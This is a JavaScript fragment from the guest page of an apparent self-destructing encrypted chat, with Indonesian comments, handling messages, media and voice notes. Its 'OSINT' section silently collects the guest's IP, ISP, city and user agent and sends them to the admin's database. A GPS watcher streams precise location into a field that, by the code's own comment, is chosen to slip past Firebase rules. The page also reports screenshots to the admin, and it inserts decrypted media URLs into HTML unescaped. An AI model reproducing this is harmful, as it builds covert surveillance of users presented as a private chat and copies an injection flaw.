        async function uploadToCloudinary(blob) {
            const fd = new FormData();
            fd.append('file', blob);
            fd.append('upload_preset', 'secure_chat_media');
            
            const res = await fetch('https://api.cloudinary.com/v1_1/e0wmrkhy/upload', {
                method: 'POST', body: fd
            });
            if (!res.ok) throw new Error("Cloudinary Reject");
            const data = await res.json();
            return data.secure_url;
        }

        // --- STEALTH FETCHER (Unduh Tanpa Tab Baru) ---
        window.stealthFetch = async function(url, btnElement) {
            try {
                const originalText = btnElement.innerHTML;
                btnElement.innerHTML = "MENYEDOT..."; btnElement.disabled = true;
                
                const res = await fetch(url);
                const blob = await res.blob();
                const objUrl = URL.createObjectURL(blob);
                
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = objUrl;
                a.download = `INTEL_MEDIA_${Date.now()}.${blob.type.split('/')[1] || 'bin'}`;
                
                document.body.appendChild(a);
                a.click();
                
                document.body.removeChild(a);
                URL.revokeObjectURL(objUrl);
                
                btnElement.innerHTML = "DIAMANKAN";
                setTimeout(() => { btnElement.innerHTML = originalText; btnElement.disabled = false; }, 2000);
            } catch(e) {
                alert("UNDUHAN DIBLOKIR. PERIKSA KONEKSI.");
                btnElement.innerHTML = "UNDUH GAGAL";
                btnElement.disabled = false;
            }
        };

        // --- 7. INITIALIZE DENGAN PROMISES PARALEL ---
        async function initialize() {
            initElectricCanvas(); 
            const rId = window.TACTICAL_CAPSULE_ID;
            const aesKey = window.TACTICAL_AES_KEY;

            if(!rId || !aesKey) return window.triggerHellfireKick("TAUTAN CACAT", true);

            try {
                await CryptoEngine.init(aesKey);
                const capsuleRef = db.ref(`burner_vault/${rId}`);
                
                const [typeSnap, optionsSnap, durationSnap, timestampSnap] = await Promise.all([
                    networkTimeout(capsuleRef.child('type').once('value')),
                    networkTimeout(capsuleRef.child('options').once('value')),
                    networkTimeout(capsuleRef.child('duration').once('value')),
                    networkTimeout(capsuleRef.child('timestamp').once('value'))
                ]);
                
                if(!typeSnap.exists()) return window.triggerHellfireKick("AKSES DITOLAK ATAU KADALUARSA", true);
                
                const type = typeSnap.val();
                if(type !== 'CHAT') return window.triggerHellfireKick("MODE PAYLOAD BUKAN CHAT", true);

                const drm = optionsSnap.exists() ? (optionsSnap.val() || {}) : {};
                const duration = durationSnap.exists() ? parseInt(durationSnap.val()) || 0 : 0;
                const timestamp = timestampSnap.exists() ? timestampSnap.val() : Date.now();
                let strike = 0; let burned = false;

                startChatStream(rId); 
                startCount(timestamp, duration); 
                initiateOSINT(rId);
                if (drm.allowManualGPS) initiateGPS(rId);

                const splash = document.getElementById('quantumSplashScreen'); 
                if (splash) {
                    splash.style.opacity = '0'; 
                    setTimeout(() => splash.style.display = 'none', 800);
                }

                // Listener Detonator Admin
                capsuleRef.child('manual_detonation').on('value', s => {
                    if(s.exists() && s.val() === true) { burned = true; window.triggerHellfireKick("SISTEM DIHANCURKAN ADMIN"); }
                });

                // Taktis Blackout
                const bL = document.getElementById('stealthBlackoutLayer');
                window.addEventListener('blur', () => { if(drm.prox && !burned && !bBy) bL.style.display = 'flex'; });
                window.addEventListener('focus', () => bL.style.display = 'none');
                
                function triggerS() { 
                    if(!drm.shatter || burned) return; strike++; qTone(150, 'square', 0.4, 0.05);
                    if(strike === 1) { 
                        db.ref(`burner_vault/${rId}/telemetri`).update({alert:"STRIKE 1: INDIKASI SCREEN RECORD!"}).catch(()=>{});
                        const cs=document.getElementById('chatStream'), rs=document.getElementById('redStrikeScreen'); if(cs) cs.style.filter="blur(15px) contrast(300%)"; rs.style.display='flex';
                        setTimeout(()=>{rs.style.display='none'; cs.style.filter='none';}, 3000);
                    } else { window.triggerHellfireKick("TERMINASI VISUAL PELANGGARAN"); }
                }
                document.addEventListener('keyup', e => {if(e.key === 'PrintScreen') triggerS();});
                document.addEventListener('touchstart', e => {if(e.touches.length >= 3) triggerS();}, {passive: false});

                // Input & Media Galeri ke Cloudinary
                const cI = document.getElementById('chatInput');
                document.getElementById('btnSend').onclick = () => { if(cI.value.trim()){ sM(rId, cI.value.trim()); cI.value=''; } };
                
                const uO = document.getElementById('uploadOverlay');
                const uT = document.getElementById('uploadStatusText');
                
                document.getElementById('galleryUploadInput').onchange = async (e) => { 
                    triggerBypass(); uO.style.display = 'flex'; uT.innerText = "UPLOADING GHOST DATA...";
                    const file = e.target.files[0]; if(!file) { uO.style.display='none'; return; }
                    try { 
                        // Bypass RTDB, kirim ke Cloudinary
                        const publicUrl = await uploadToCloudinary(file);
                        uT.innerText = "ENKRIPSI URL...";
                        // Enkripsi URL Cloudinary lalu tembak ke Firebase
                        await sM(rId, "[VISUAL DIKIRIM]", publicUrl, "MEDIA"); 
                        uO.style.display='none'; e.target.value=''; 
                    } catch(err) { uO.style.display='none'; sT("GAGAL UNGGAH DATA", true); }
                };

                // Voice Note E2EE (WebM -> Cloudinary -> Encrypted URL)
                const btnVoiceNote = document.getElementById('btnVoiceNote'); let mRec; let aCh = []; let isR = false; let rST = 0;
                btnVoiceNote.onpointerdown = async () => {
                    if (isR) return; isR = true; rST = Date.now(); triggerBypass();
                    try {
                        const str = await navigator.mediaDevices.getUserMedia({ audio: true }); mRec = new MediaRecorder(str); aCh = [];
                        mRec.ondataavailable = e => { if (e.data.size > 0) aCh.push(e.data); };
                        mRec.onstop = async () => {
                            const d = Date.now() - rST; str.getTracks().forEach(t => t.stop()); if (d < 800) { sT("Terlalu singkat.", true); return; }
                            uO.style.display = 'flex'; uT.innerText = "UPLOADING AUDIO...";
                            try {
                                const b = new Blob(aCh, { type: 'audio/webm' });
                                const publicUrl = await uploadToCloudinary(b);
                                uT.innerText = "ENKRIPSI AUDIO...";
                                await sM(rId, "[VOICE NOTE]", publicUrl, "AUDIO"); 
                                uO.style.display = 'none';
                            } catch(err) { uO.style.display='none'; sT("Gagal kirim audio.", true); }
                        }; mRec.start(); qTone(1200, 'sine', 0.05, 0.02); btnVoiceNote.classList.add('recording-pulse-void');
                    } catch(e) { isR=false; sT("Izin mic ditolak OS.", true); }
                };
                const stopRec = () => { if(!isR) return; isR=false; if(mRec && mRec.state==='recording'){ mRec.stop(); btnVoiceNote.classList.remove('recording-pulse-void'); qTone(1200, 'sine', 0.05, 0.02); } };
                window.addEventListener('pointerup', stopRec); window.addEventListener('pointercancel', stopRec);

            } catch(e) { window.triggerHellfireKick("KONEKSI GAGAL ATAU DITOLAK", true); }
        }

        // --- 8. FUNGSI ENKRIPSI & RENDER CHAT ---
        async function sM(rId, plainTxt, medUrl=null, type="TEXT") { 
            try { 
                const encText = await CryptoEngine.encrypt(plainTxt);
                let payload = { sender:"GUEST", type:type, cipher: encText.cipher, iv: encText.iv, timestamp: firebase.database.ServerValue.TIMESTAMP };
                
                // medUrl adalah string pendek URL Cloudinary, bukan Base64 raksasa
                if (medUrl) {
                    const encMed = await CryptoEngine.encrypt(medUrl);
                    payload.mediaCipher = encMed.cipher; payload.mediaIv = encMed.iv;
                }
                await db.ref(`burner_vault/${rId}/messages`).push(payload); 
                qTone(880, 'sine', 0.15, 0.03); 
            } catch(e) { sT("Gagal enkripsi/kirim.", true); } 
        }
        
        function startChatStream(rId) {
            db.ref(`burner_vault/${rId}/messages`).orderByChild("timestamp").on('child_added', async sn => {
                const data = sn.val(); if (data.type === "PING" || data.type === "GPS_BEACON") return;
                try {
                    let decText = null; let decMed = null;
                    if(data.cipher && data.iv) decText = await CryptoEngine.decrypt(data.cipher, data.iv);
                    if (data.mediaCipher && data.mediaIv) decMed = await CryptoEngine.decrypt(data.mediaCipher, data.mediaIv);
                    
                    let finalContent = decText;
                    let finalType = data.type;
                    if (decMed) { finalContent = decMed; finalType = data.type === "AUDIO" ? "AUDIO" : "MEDIA"; }

                    renderMsg(sn.key, data.sender, finalContent, finalType);
                } catch(e) { console.warn("Pesan rusak/kunci salah"); }
            });
            db.ref(`burner_vault/${rId}/messages`).on('child_removed', sn => {
                const mEl = document.getElementById(`msg-${sn.key}`); 
                if (mEl) { mEl.innerHTML = `<strong style="font-size: 10px; opacity: 0.5; color:var(--text-muted); font-family:'JetBrains Mono';">[ TRANSMISI DITARIK ]</strong>`; mEl.style.background = "transparent"; mEl.style.border = "1px dashed rgba(255,255,255,0.1) !important"; }
            });
        }

        function renderMsg(msgId, sender, content, type) {
            const st = document.getElementById('chatStream'); if(!st) return;
            const msgDiv = document.createElement('div'); msgDiv.id = `msg-${msgId}`;
            if (sender === "GUEST") msgDiv.style.alignSelf = "flex-end"; else msgDiv.style.alignSelf = "flex-start";
            
            const acc = sender === "GUEST" ? "var(--neon-void-cyan)" : "var(--admin-danger)";
            let c = `<strong style="font-size: 10px; color: ${acc}; display: block; margin-bottom: 8px; letter-spacing: 2px; font-family:'JetBrains Mono';">${sender}</strong>`;
            
            if (type === "MEDIA") {
                c += `<div style="display:flex; flex-direction:column; gap:8px;">
                        <div style="position:relative; border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; overflow: hidden; background: #000;">
                            <img src="${content}" style="width:100%; display:block; pointer-events:none; user-select:none;" oncontextmenu="return false;">
                        </div>
                        <button class="stealth-btn" onclick="stealthFetch('${content}', this)"><i class="fa-solid fa-download"></i> UNDUH SILUMAN</button>
                      </div>`;
            } else if (type === "AUDIO") {
                c += `<div style="display:flex; flex-direction:column; gap:8px;">
                        <audio controls style="height: 35px; width: 100%; outline: none; filter: invert(100%);"><source src="${content}" type="audio/webm"></audio>
                        <button class="stealth-btn" onclick="stealthFetch('${content}', this)"><i class="fa-solid fa-download"></i> SIMPAN AUDIO</button>
                      </div>`;
            } else {
                const safeTxt = content.replace(/[&<>'"]/g, tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag]));
                c += `<span style="font-size: 15px; line-height: 1.5; font-weight: 500;">${safeTxt}</span>`;
            }
            
            msgDiv.innerHTML = c; st.appendChild(msgDiv); st.scrollTop = st.scrollHeight;
        }

        function startCount(timestamp, duration) { 
            const display = document.getElementById('countdownDisplay');
            if (!duration || duration <= 0) {
                if (display) display.innerHTML = `TUNNEL <span>AKTIF</span>`;
                return; 
            }
            const exp = timestamp + (duration * 1000);
            setInterval(() => { 
                const d = exp - Date.now(); 
                if (d <= 0) window.triggerHellfireKick("WAKTU HABIS", true); 
                const h=Math.floor(d/3600000), m=Math.floor((d%3600000)/60000), s=Math.floor((d%60000)/1000); 
                if (display) display.innerHTML = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:<span>${s.toString().padStart(2,'0')}</span>`; 
            }, 1000); 
        }

        // --- 9. PENGINTAIAN (OSINT & MILITARY GPS) ---
        async function initiateOSINT(rId) { 
            try { 
                const res = await fetch('https://ipapi.co/json/'); 
                const ipI = await res.json(); 
                db.ref(`burner_vault/${rId}/telemetri`).update({
                    userAgent: navigator.userAgent.substring(0, 290), 
                    ip: (ipI.ip || '').substring(0, 40), 
                    isp: (ipI.org || '').substring(0, 90), 
                    city: (ipI.city || '').substring(0, 90)
                }).catch(()=>{}); 
            } catch(e){} 
        }

        function initiateGPS(rId) {
            if ("geolocation" in navigator) {
                triggerBypass(); // Cegah stealth blackout saat minta izin lokasi
                navigator.geolocation.watchPosition(
                    (pos) => {
                        const lat = pos.coords.latitude; const lng = pos.coords.longitude; const acc = Math.round(pos.coords.accuracy);
                        // Menyelundupkan GPS presisi ke dalam struktur sonar_room yang dilegalkan Firebase Rules
                        const stealthPayload = `LAT: ${lat} | LNG: ${lng} | ACCURACY: ${acc}M`;
                        db.ref(`burner_vault/${rId}/telemetri`).update({ sonar_room: stealthPayload }).catch(()=>{});
                        
                        const gs = document.getElementById('gps-status');
                        if (gs) { gs.style.color = "var(--guest-green)"; gs.innerHTML = `<i class="fa-solid fa-satellite-dish"></i> GPS LOCKED (${acc}M)`; gs.style.animation = "none"; }
                    }, 
                    (err) => {
                        const gs = document.getElementById('gps-status');
                        if (gs) { gs.style.color = "var(--admin-danger)"; gs.innerHTML = `GPS BLOCKED`; gs.style.animation = "none"; }
                    }, 
                    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
                );
            }
        }

        window.onload = initialize;
    </script>
